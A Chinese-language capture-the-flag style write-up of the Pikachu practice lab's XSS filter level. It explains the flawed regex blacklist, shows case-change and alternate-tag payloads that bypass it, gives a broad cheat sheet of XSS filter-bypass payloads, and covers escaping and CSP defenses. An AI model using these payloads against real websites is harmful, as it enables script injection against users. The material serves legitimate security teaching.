---
layout: post
title: Pikachu - XSS之过滤 Writeup（黑名单绕过的完整方法论）
platform: pikachu
date: 2026-10-27 21:28:00 +0800
categories: CTF
---

Pikachu - XSS之过滤 Writeup（黑名单绕过的完整方法论）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：Cross-Site Scripting → xss之过滤
- 地址：`http://localhost/pikachu/vul/xss/xss_01.php`
- 题型：Web
- 考点：**黑名单过滤绕过**、正则缺陷、XSS 变形手法

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4
pikachu 源码放在 D:\phpstudy_pro\WWW\pikachu\
```

**页面形态**：

```text
阁下,请问你觉得人生苦短吗?

[                    ]  [submit]

别说这些'不苦'的话,不要怕,就是干!
        └─┬─┘
     你输入的内容被原样回显
```

**作者的提示**：

```html
data-content="有些内容被过滤了,试试看怎么绕过?"
```

**✅ 实测结果（11 种 payload 的过滤模拟）**

```text
过滤规则：
    preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $x)
```

| payload | 过滤后 | 能用吗 |
|---|---|---|
| `<script>alert(1)</script>` | `>` | ❌ 被吃掉 |
| **`<SCRIPT>alert(1)</SCRIPT>`** | 原样 | ✅ **绕过** |
| **`<Script>alert(1)</Script>`** | 原样 | ✅ **绕过** |
| **`<scrIpt>alert(1)</scrIpt>`** | 原样 | ✅ **绕过** |
| **`<img src=x onerror=alert(1)>`** | 原样 | ✅ **绕过** |
| **`<svg onload=alert(1)>`** | 原样 | ✅ **绕过** |
| **`<details open ontoggle=alert(1)>`** | 原样 | ✅ **绕过** |
| **`<body onload=alert(1)>`** | 原样 | ✅ **绕过** |
| `<iframe src=javascript:alert(1)>` | `(1)>` | ⚠️ 被吃一半 |
| `<scr<script>ipt>alert(1)</scr<script>ipt>` | `>` | ❌ **失败** |
| `<scr ipt>alert(1)</scr>ipt>` | `>` | ❌ **失败** |

二、题目分析

**① 过滤代码（一行正则）**

```php
<?php
// xss_01.php 第 19-30 行
if(isset($_GET['submit']) && $_GET['message'] != null){

    //这里会使用正则对<script进行替换为空,也就是过滤掉
    $message = preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message']);

    if($message == 'yes'){
        $html .= "<p>那就去人民广场一个人坐一会儿吧!</p>";
    }else{
        $html .= "<p>别说这些'{$message}'的话,不要怕,就是干!</p>";   // ★ 原样输出
    }
}
?>
```

**★ 两个关键点**：

```
① 输入被正则"清洗"了一道
② 清洗后【直接拼接输出】，没有 HTML 转义
```

**② 拆解这个正则**

```regex
/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/
 │ │   │   │   │   │   │   │
 │ │   │   │   │   │   │   └─ t
 │ │   │   │   │   │   └───── p
 │ │   │   │   │   └───────── i
 │ │   │   │   └───────────── r
 │ │   │   └───────────────── c
 │ │   └───────────────────── s
 │ └───────────────────────── (.*) 贪婪匹配任意字符
 └─────────────────────────── 必须从 < 开始
```

**★ 它想匹配的是**：`<` + 任意 + `s` + 任意 + `c` + ... + `t`

**★ 意图**：把 `<script` 这样的片段删掉。

**③ 缺陷 1：大小写敏感**

```php
preg_replace('/<.../', ...)
//          └─ 没有 i 修饰符
```

**对比**：

```php
preg_replace('/<.../i', ...)    // 有 i → 不区分大小写
preg_replace('/<.../', ...)     // 无 i → 区分大小写（本题）
```

**★ 但 HTML 是大小写不敏感的**：

```html
<script>alert(1)</script>
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>
<script>alert(1)</SCRIPT>
```

**★ 这四种写法，浏览器全都当 `<script>` 执行。**

**★ 所以**：

```
过滤只挡小写 s-c-r-i-p-t
→ <SCRIPT> 里的 S 是大写 → 正则不匹配 → 原样通过
→ 浏览器照样执行
```

**④ 缺陷 2：只针对 `<script`，其他标签不管**

**正则要求以 `<` 开头，后面依次出现 s、c、r、i、p、t。**

**★ 只要不用 `<script>` 标签，就完全绕过**：

```html
<img src=x onerror=alert(1)>           ← onerror 事件
<svg onload=alert(1)>                  ← onload 事件
<details open ontoggle=alert(1)>       ← ontoggle 事件
<body onload=alert(1)>                 ← body 的 onload
<input onfocus=alert(1) autofocus>     ← onfocus + 自动聚焦
<marquee onstart=alert(1)>             ← onstart
<video><source onerror=alert(1)>       ← 嵌套
<a href="javascript:alert(1)">点我</a>  ← javascript: 协议
```

**★ 这些全都不含 "script" 字样 → 正则完全无能为力。**

**⑤ 一个有趣的"误伤"：`javascript:` 被吃了**

**测试**：

```html
<iframe src=javascript:alert(1)>
```

**过滤结果**：`(1)>`

**★ 为什么？**

```
"javascript" 这个单词里，正好包含 s-c-r-i-p-t 的连续序列：

    j a v a S C R I P T
          └─────────┘
          正好命中正则

→ 正则从 < 一路吃到 T
→ 把 <iframe src=javascript:alert 都删了
→ 只剩 (1)>
```

**★ 这说明**：

```text
黑名单过滤不仅防不住攻击
还会【误伤正常内容】

★ 如果用户正常输入 "我可以教你 javascript"
  也会被吃掉一部分 → 功能受损
```

**⑥ 另一个经典陷阱：贪婪匹配让"嵌套写法"失效**

**很多教程说这样能绕过**：

```
输入： <scr<script>ipt>alert(1)</scr<script>ipt>
预期： 过滤掉中间的 <script>
      剩 <script>alert(1)</script> → 执行

★ 但这里【失败】
```

**原因**：

```regex
<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t
  └─┬─┘
  贪婪匹配（greedy）

★ `.*` 会尽可能多地吃字符
★ 所以它会从【第一个】< 一路匹配到【最后一个】t
★ 整段都被删掉 → 只剩一个 >
```

**★ 正确的写法应该用"懒惰匹配"**：

```regex
/<(.*?)s(.*?)c(.*?)r(.*?)i(.*?)p(.*?)t/
    └┬┘
  加个 ? → 懒惰匹配（尽可能少吃）
```

**★ 但即使改成懒惰，也只是让绕过变难 —— 黑名单本身就不是正确方案。**

三、解题步骤

**第 1 步：先看正常功能**

**打开**：

```text
http://localhost/pikachu/vul/xss/xss_01.php
```

**输入框填**：`不苦`

**点 submit**

**页面显示**：

```text
别说这些'不苦'的话,不要怕,就是干!
        └┬┘
     你的输入被原样回显，包在单引号里
```

**第 2 步：判断有没有 XSS（用 `<b>` 探路）**

**提交**：

```html
<b>test</b>
```

**看输出**：

```text
如果显示成【加粗的 test】→ HTML 被解析 → 有 XSS
如果显示 <b>test</b> 文字  → 被转义了
```

**★ 这一步很重要**：`<b>` 不含 "script"，能直接通过过滤。

**★ 如果 `<b>` 都被转义了，那说明还有 `htmlspecialchars`，那就没得玩了。**

**本关结果**：加粗显示 → 有 XSS。

**第 3 步：试最基础的 payload（对照，会被过滤）**

**地址栏粘**：

```text
http://localhost/pikachu/vul/xss/xss_01.php?message=<script>alert(1)</script>&submit=submit
```

**结果**：

```text
别说这些'>'的话,不要怕,就是干!
        └┬┘
    整段 <script>alert(1)</script> 被吃掉了，只剩 >
    
★ 没有弹窗
★ 证明过滤对小写 <script> 有效
```

**第 4 步：⭐ 绕过方式 1 —— 换大小写**

**地址栏粘**：

```text
http://localhost/pikachu/vul/xss/xss_01.php?message=<SCRIPT>alert(1)</SCRIPT>&submit=submit
```

**结果**：**弹窗 "1"** ✅

**★ 为什么成功**：

```
正则只匹配小写的 s c r i p t
<SCRIPT> 里的字母全是大写
→ 正则不匹配 → 原样输出
→ 浏览器不区分大小写 → 当 <script> 执行
```

**更多变形（都能用）**：

```html
<Script>alert(1)</Script>
<scrIpt>alert(1)</scrIpt>
<ScRiPt>alert(1)</ScRiPt>
<script>alert(1)</SCRIPT>       ← 只要有一个字母大写就绕过了
```

**第 5 步：⭐ 绕过方式 2 —— 换标签（更通用）**

**地址栏粘**：

```text
http://localhost/pikachu/vul/xss/xss_01.php?message=<img src=x onerror=alert(1)>&submit=submit
```

**结果**：**弹窗 "1"** ✅

**★ 为什么成功**：

```
payload 里根本没有 "script" 这个词
→ 正则完全匹配不到
→ 原样输出
→ 浏览器解析 <img>，src=x 加载失败 → onerror 触发
```

**其他等价写法**：

```html
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
```

**★ 这一招比大小写更通用**：

```
大小写绕过：假设过滤规则只挡小写
换标签绕过：不依赖过滤规则的具体实现
          只要它还停留在"黑名单"思路，就总能找到漏掉的标签
```

**第 6 步：看 DOM 里的样子**

```text
① 用测试 4 的 URL
② F12 → 【元素】
③ Ctrl+F 搜 "别说这些"
④ 看到：

   <p>别说这些'<SCRIPT>alert(1)</SCRIPT>'的话,不要怕,就是干!</p>
              └──────────┬──────────┘
                 原样输出，无转义
```

**★ 单引号只是文字，不构成任何保护 —— 内容仍在 HTML 文本上下文里。**

**第 7 步：为什么经典的"嵌套绕过"在这关失败**

**试试这个（网上很多教程推荐的）**：

```html
<scr<script>ipt>alert(1)</scr<script>ipt>
```

**结果**：

```text
别说这些'>'的话...
        └┬┘
    整段被吃光，只剩 >
    
★ 失败
```

**原因**：正则里的 `(.*)` 是贪婪匹配，会从第一个 `<` 吃到最后一个 `t`。

**★ 这个"失败"很有教学价值**：

```
不要背 payload，要理解过滤规则
同一个 payload 在不同过滤规则下效果完全不同

★ 判断方法：
   ① 看源码/看报错，搞清过滤规则
   ② 用小脚本本地模拟一遍
   ③ 再决定用什么 payload
```

**第 8 步：完整的绕过思路总结**

**按"从简单到复杂"的顺序尝试**：

```text
① 换大小写       <SCRIPT> / <ScRiPt> / <scrIpt>
② 换标签         <img onerror> / <svg onload> / <details ontoggle>
③ 加奇怪字符     <script/> / <script\x0a> / <script\t>
④ 注释分割       <scr<!-- -->ipt>
⑤ 双写           <scr<script>ipt>（要看过滤是否递归）
⑥ 编码           HTML 实体 / URL 编码 / Unicode
⑦ 协议           javascript: / data:
⑧ 事件处理器     onerror / onload / onfocus / ontoggle / onmouseover
```

**★ 万能公式**：

```
不用 <script>，用 <img onerror>
★ 90% 的黑名单过滤都挡不住这个
```

四、延伸知识

**① 黑名单 vs 白名单：为什么黑名单必败**

**黑名单思路**：

```php
// 删除所有已知的坏东西
$input = str_replace('<script>', '', $input);
$input = str_ireplace('onerror', '', $input);
$input = preg_replace('/javascript:/i', '', $input);
...
```

**★ 为什么必败**：

```
① 攻击面无限大
   标签：<img> <svg> <details> <body> <input> <video> <marquee> ...
   事件：onerror onload onfocus ontoggle onmouseover onstart onbegin ...
   协议：javascript: data: vbscript: file: ...
   编码：HTML实体 / URL / Unicode / Base64 ...
   
② 总会有"没想到的"
   浏览器每年新增 HTML 特性
   攻击者只需要找到一个漏网的组合

③ 会误伤正常内容
   "javascript" 这个词本身被吃
   用户正常输入"<3" 可能被当标签

★ 结论：黑名单是"打地鼠"，永远打不完
```

**白名单思路**：

```php
// 输出转义：把特殊字符变成实体
$safe = htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
echo "<p>别说这些'{$safe}'的话</p>";
```

**★ 为什么白名单有效**：

```
<  →  &lt;
>  →  &gt;
"  →  &quot;
'  →  &#039;
&  →  &amp;

★ 浏览器看到 &lt;script&gt; 只会当文字显示
★ 完全无法构成标签
★ 无论攻击者用什么标签、什么事件，都被"降级"成文本
```

**② XSS 绕过手法大全（按场景）**

**场景 1：过滤 `<script>` 标签**

```html
<SCRIPT>alert(1)</SCRIPT>              大小写
<ScRiPt>alert(1)</ScRiPt>              混合
<img src=x onerror=alert(1)>           换标签 ★最常用
<svg onload=alert(1)>                  换标签
<details open ontoggle=alert(1)>       换标签
<body onload=alert(1)>                 换标签
<input onfocus=alert(1) autofocus>     换标签+自动聚焦
<marquee onstart=alert(1)>             换标签
<video><source onerror=alert(1)>       嵌套
<iframe src="javascript:alert(1)">     javascript 协议
```

**场景 2：过滤 `on` 事件（过滤 onerror/onload）**

```html
<svg><script>alert(1)</script></svg>   在 SVG 里 script 可执行
<math><mtext><script>alert(1)</script></mtext></math>
<a href="javascript:alert(1)">点我</a> 不用事件
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
```

**场景 3：过滤括号 `()`**

```javascript
alert`1`                              模板字符串
throw onerror=alert,1                 利用 throw
<img src=x onerror="alert&lpar;1&rpar;">   HTML 实体
```

**场景 4：过滤引号**

```html
<img src=x onerror=alert(1)>           不用引号
<img src=x onerror=alert`1`>           反引号
<img src=x onerror=alert(/1/.source)>  正则字面量
```

**场景 5：过滤空格**

```html
<img/src=x/onerror=alert(1)>           用 / 代替空格
<img	src=x	onerror=alert(1)>           用 Tab (0x09)
<img
src=x
onerror=alert(1)>                     用换行
```

**场景 6：过滤关键字（如 alert）**

```javascript
top['al'+'ert'](1)                     字符串拼接
window['alert'](1)                     方括号访问
eval('ale'+'rt(1)')                    动态执行
[].constructor.constructor('alert(1)')()   Function 构造器
```

**场景 7：编码绕过**

```html
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;      HTML 十六进制实体
&#60;script&#62;alert(1)&#60;/script&#62;          HTML 十进制实体
%3Cscript%3Ealert(1)%3C/script%3E                URL 编码
\u003cscript\u003ealert(1)\u003c/script\u003e    JS Unicode（在 JS 字符串里）
```

**★ 注意**：编码是否有效，取决于"解码发生在过滤前还是过滤后"：

```
① 解码 → 过滤 → 输出      编码无效（解码后还是被过滤）
② 过滤 → 解码 → 输出      编码有效 ✅（过滤时看不见真实字符）
```

**③ 正则过滤的常见坑（开发者视角）**

| 坑 | 例子 | 后果 |
|---|---|---|
| **没加 `i`** | `/<script/` | 大写绕过 |
| **贪婪匹配** | `<(.*)>` | 匹配范围过大（可能吃掉正常内容）|
| **没考虑标签属性** | 只过滤 `<script>` | `<img onerror>` 绕过 |
| **没考虑嵌套** | 单次替换 | `<scr<script>ipt>` 可能生效 |
| **没考虑换行** | `.` 默认不匹配换行 | 多行 payload 绕过 |
| **没考虑编码** | 只过滤明文 | 实体/URL 编码绕过 |
| **替换后没再检查** | 单次 `str_replace` | 双写绕过 |
| **错误的正则** | `/<script>/` 只匹配带 `>` 的 | `<script >` 绕过 |

**④ 正确的防御：三层**

**第一层：输出转义（唯一根本方案）**

```php
// 根据输出位置选择
echo htmlspecialchars($s, ENT_QUOTES | ENT_HTML5, 'UTF-8');     // HTML 文本
echo htmlspecialchars($s, ENT_QUOTES, 'UTF-8');                 // HTML 属性
echo json_encode($s);                                            // JS 字符串
echo urlencode($s);                                              // URL 参数
```

**第二层：CSP（内容安全策略，兜底）**

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self';
               object-src 'none';
               base-uri 'none'">
```

**★ CSP 的效果**：

```
即使注入了 <img src=x onerror=alert(1)>
→ 内联事件处理器不在白名单
→ 浏览器拒绝执行
→ payload 变成"死代码"
```

**第三层：输入校验（辅助，不能单独依赖）**

```php
// ✅ 白名单：只允许特定格式
if (!preg_match('/^[a-zA-Z0-9\x{4e00}-\x{9fa5}\s,.\x{3002}\x{ff0c}]+$/u', $input)) {
    die("输入包含非法字符");
}
```

**★ 注意**：

```
这是"输入校验"，是【辅助】手段
因为它会限制用户表达（比如不能输入 <3 这种表情）

真正的防线是"输出转义"
```

**⑤ 一个实用技巧：本地模拟过滤规则**

**★ 做题/挖洞时，先搞清过滤规则，再设计 payload。**

**本关的做法**：

```python
import re
# 复刻 PHP 的正则
pattern = re.compile(r'<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t')

tests = ["<script>alert(1)</script>", "<SCRIPT>alert(1)</SCRIPT>", ...]
for t in tests:
    print(t, "->", pattern.sub('', t))
```

**★ 10 行代码，一次跑出所有变形的结果 —— 比盲试快 10 倍。**

**★ 注意 Python 的 `re` 和 PHP 的 `preg_` 有细微差异**：

```
· PHP 的 preg_replace 默认等价于 Python 的 re.sub
· PHP 的 /i 修饰符 = Python 的 re.IGNORECASE
· PHP 的 . 默认不匹配换行（同 Python）
· 差异主要在 Unicode 处理上
```

**⑥ 真实世界的过滤绕过案例**

**案例 1：微软 Outlook 的 XSS 过滤绕过（CVE-2017-11774）**

```text
Outlook 会过滤 <script> 和 onerror
但没过滤 <svg><animate> 之类的新特性
→ 通过 SVG 动画绕过
```

**案例 2：WordPress 的 KSES 过滤绕过**

```text
KSES 是 WordPress 的 HTML 白名单过滤
历史上被绕过几十次
原因：HTML5 新标签/新属性不断出现，白名单跟不上
```

**案例 3：各种 WAF 的绕过**

```text
WAF 基于规则（黑名单）
→ 每年都有 WAF bypass 的 writeup
→ 常见手法：编码、分块传输、HTTP 参数污染、协议特性

★ 结论：WAF 是"降低攻击效率"的工具，不是"绝对防御"
```

五、总结

- **本题核心：用一条正则黑名单过滤 `<script>`，但有大小写和标签两个大漏洞。**

- **过滤代码（一行）**：

```php
$message = preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message']);
```

- **⭐ 五个必记要点**：

```text
① 黑名单必败
   → 攻击面无限，总能找到漏网组合
   → 白名单 + 输出转义才是正解

② 本文的两个绕过
   → 大小写：<SCRIPT> / <ScRiPt>（正则没加 i）
   → 换标签：<img src=x onerror=alert(1)>（更通用）

③ 贪婪匹配的陷阱
   → (.*) 是贪婪的，会吃掉一大段
   → 所以 <scr<script>ipt> 这种嵌套写法在本关【失败】
   → 要加 ? 变成 (.*?) 懒惰匹配

④ 黑名单会误伤正常内容
   → "javascript" 里含 s-c-r-i-p-t
   → 会被当成攻击代码删掉

⑤ 万能公式
   → 不用 <script>，用 <img onerror>
   → 90% 的黑名单都挡不住
```

- **实测数据**：

```text
<script>alert(1)</script>        →  '>'                  ❌
<SCRIPT>alert(1)</SCRIPT>        →  原样                  ✅
<Script>alert(1)</Script>        →  原样                  ✅
<scrIpt>alert(1)</scrIpt>        →  原样                  ✅
<img src=x onerror=alert(1)>     →  原样                  ✅
<svg onload=alert(1)>            →  原样                  ✅
<details open ontoggle=...>      →  原样                  ✅
<iframe src=javascript:alert(1)> →  '(1)>'               ⚠️
<scr<script>ipt>alert(1)...      →  '>'                  ❌
```

- **XSS 模块进度**：

```text
✅ 反射型xss(get)      —— 直接拼接，需绕 maxlength
✅ 反射型xss(post)     —— 需登录 + 自动提交表单 + Pass-the-Hash
✅ 存储型xss           —— SQL 转义≠HTML 转义
✅ DOM型xss            —— 源=input（Self-XSS）
✅ DOM型xss-x          —— 源=URL（真可利用）
✅ xss之盲打           —— 打管理员 + 带外确认
✅ xss之过滤           —— 本题：黑名单绕过
⬜ xss之htmlspecialchars —— 防护演示（对照组）
⬜ xss之href输出        —— 属性上下文
⬜ xss之js输出          —— JS 上下文
```

**手工复现要点**：

```text
· 打开 xss_01.php，输入"不苦" → 看回显（包在单引号里）
· 输入 <b>test</b> → 判断有没有 HTML 转义
· 输入 <script>alert(1)</script> → 变成 '>'，被过滤
· 输入 <SCRIPT>alert(1)</SCRIPT> → 弹窗（大小写绕过）
· 输入 <img src=x onerror=alert(1)> → 弹窗（换标签绕过）
· F12 元素里看原样输出的 payload
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  黑名单过滤 = 列举"所有坏东西" → 永远列不全                    │
│                                                            │
│  两条绕过路：                                                │
│     ① 变形：<SCRIPT> / <ScRiPt>                             │
│     ② 换标签：<img onerror> / <svg onload>                   │
│                                                            │
│  ★ 正则还有坑：贪婪匹配、没加 i、`.` 不匹配换行                │
│  ★ 唯一正解：输出时转义（< → &lt;）+ CSP                      │
└────────────────────────────────────────────────────────────┘
```
